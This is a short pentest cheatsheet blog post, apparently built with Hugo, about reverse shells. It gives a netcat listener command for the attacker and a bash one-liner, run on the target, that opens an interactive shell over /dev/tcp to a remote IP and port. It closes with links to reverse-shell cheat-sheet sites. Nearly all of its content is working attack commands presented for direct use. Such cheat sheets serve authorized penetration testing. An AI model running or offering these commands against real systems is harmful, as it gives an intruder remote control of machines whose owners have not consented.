---
title: "Reverse Shell"
date: 2022-10-18T01:30:03+00:00
# weight: 1
# aliases: ["/first"]
tags: ["pentest"]
categories: ["cheatsheet"]
author: "Me"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Desc Text."
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
---

## Start a listener on attacker:
```
nc -lp 9001
# ip=10.10.10.10
# port=9001
```

## Run a shell on target:
* bash
```
bash -i >& /dev/tcp/192.168.1.10/9001 0>&1
```

## References
* https://www.revshells.com/
* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet